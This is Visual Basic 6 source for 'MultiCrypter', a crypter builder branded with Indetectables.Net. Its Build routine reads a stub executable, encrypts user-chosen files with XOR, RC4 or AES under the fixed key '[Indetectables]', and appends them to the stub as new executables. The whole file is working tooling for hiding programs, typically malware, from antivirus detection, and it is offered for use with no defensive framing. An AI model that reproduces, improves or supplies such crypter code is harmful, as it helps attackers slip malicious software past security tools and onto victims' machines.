VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmStar 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "MultiCrypter v1.0 [www.Indetectables.Net]"
   ClientHeight    =   2550
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4935
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2550
   ScaleWidth      =   4935
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CD 
      Left            =   3600
      Top             =   600
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.ListView LV 
      Height          =   1335
      Left            =   0
      TabIndex        =   0
      Top             =   1200
      Width           =   4935
      _ExtentX        =   8705
      _ExtentY        =   2355
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Trebuchet MS"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Path"
         Object.Width           =   4410
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Name"
         Object.Width           =   2505
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Encryption"
         Object.Width           =   1764
      EndProperty
   End
   Begin VB.Image Image1 
      Height          =   1200
      Left            =   0
      Picture         =   "frmStar.frx":0000
      Top             =   0
      Width           =   4950
   End
   Begin VB.Menu mMenu 
      Caption         =   "Menu"
      Visible         =   0   'False
      Begin VB.Menu mAdd 
         Caption         =   "Add"
      End
      Begin VB.Menu mDelete 
         Caption         =   "Delete"
      End
      Begin VB.Menu mClear 
         Caption         =   "Clear"
      End
      Begin VB.Menu mEncryption 
         Caption         =   "Encryption"
         WindowList      =   -1  'True
         Begin VB.Menu mRC4 
            Caption         =   "RC4"
         End
         Begin VB.Menu mXor 
            Caption         =   "XOR"
         End
         Begin VB.Menu mAES 
            Caption         =   "AES"
         End
      End
      Begin VB.Menu mBuild 
         Caption         =   "Build"
      End
      Begin VB.Menu mDelimitador 
         Caption         =   "-"
      End
      Begin VB.Menu mAbout 
         Caption         =   "About"
      End
   End
End
Attribute VB_Name = "frmStar"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub LV_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
 Select Case Button
  Case Is = 2
   PopupMenu mMenu
 End Select
End Sub

Private Sub mAdd_Click()
 With CD
  .DialogTitle = "Select your file"
  .Filter = "All files (*.*)|*.*"
  On Error Resume Next
  .CancelError = True
  .ShowOpen
 End With
 Select Case Err.Number
  Case Is <> 32755
   LV.ListItems.Add , , CD.Filename
 End Select
 If LV.ListItems.Count <> 0 Then
  LV.ListItems.Item(LV.ListItems.Count).SubItems(1) = GetMyPath(LV.ListItems.Item(LV.ListItems.Count))
  LV.ListItems.Item(LV.ListItems.Count).SubItems(2) = "XOR"
 End If
End Sub

Private Sub mDelete_Click()
 Select Case LV.ListItems.Count
  Case Is <> 0
   LV.ListItems.Remove (LV.SelectedItem.Index)
 End Select
End Sub

Private Sub mClear_Click()
 Select Case LV.ListItems.Count
  Case Is <> 0
   LV.ListItems.Clear
 End Select
End Sub


Private Sub mXOR_Click()
 Select Case LV.ListItems.Count
  Case Is <> 0
   LV.ListItems.Item(LV.SelectedItem.Index).SubItems(2) = "XOR"
 End Select
End Sub

Private Sub mRC4_Click()
 Select Case LV.ListItems.Count
  Case Is <> 0
   LV.ListItems.Item(LV.SelectedItem.Index).SubItems(2) = "RC4"
 End Select
End Sub

Private Sub mAES_Click()
 Select Case LV.ListItems.Count
  Case Is <> 0
   LV.ListItems.Item(LV.SelectedItem.Index).SubItems(2) = "AES"
 End Select
End Sub
Private Sub mBuild_Click()
 If LV.ListItems.Count < 1 Then MsgBox "Select 2 files as minimum", vbInformation, "Error": Exit Sub
  If Dir(App.Path & "\IB.exe") = "" Then MsgBox "Stub not found verifie please", vbInformation, "Error": Exit Sub

  Open App.Path & "\IB.exe" For Binary As #1
   ib = String(FileLen(App.Path & "\IB.exe"), " ")
   Get #1, , ib
  Close #1
  
  For i = 1 To LV.ListItems.Count
  
  Open LV.ListItems.Item(i) For Binary As #1
   sInfo = String(FileLen(LV.ListItems.Item(i)), " ")
   Get #1, , sInfo
  Close #1
  
  If LV.ListItems.Item(i).SubItems(2) = "XOR" Then sInfo = X0R.EncryptString(sInfo, "[Indetectables]")
  If LV.ListItems.Item(i).SubItems(2) = "RC4" Then sInfo = RC4.EncryptString(sInfo, "[Indetectables]")
  If LV.ListItems.Item(i).SubItems(2) = "AES" Then sInfo = AES.EncryptString(sInfo, "[Indetectables]")

  Open App.Path & "\Bind-file" & i & ".exe" For Binary As #1
   Put #1, , ib & "[0]" & "[1]" & "[2]" & sInfo & "[2]" & LV.ListItems.Item(i).SubItems(2)
  Close #1
 
 Next i
  MsgBox "All files has been crypteds!", vbInformation, "Done"
End Sub

Private Sub mAbout_Click()
 MsgBox "-< Coded By The Swash >-" & vbNewLine & _
         "-< Thx to BlackZeroX & SharkI >-" & vbNewLine & _
          "-< wwW.IndetectableS.Net >-", vbInformation, "AboutMe"
End Sub
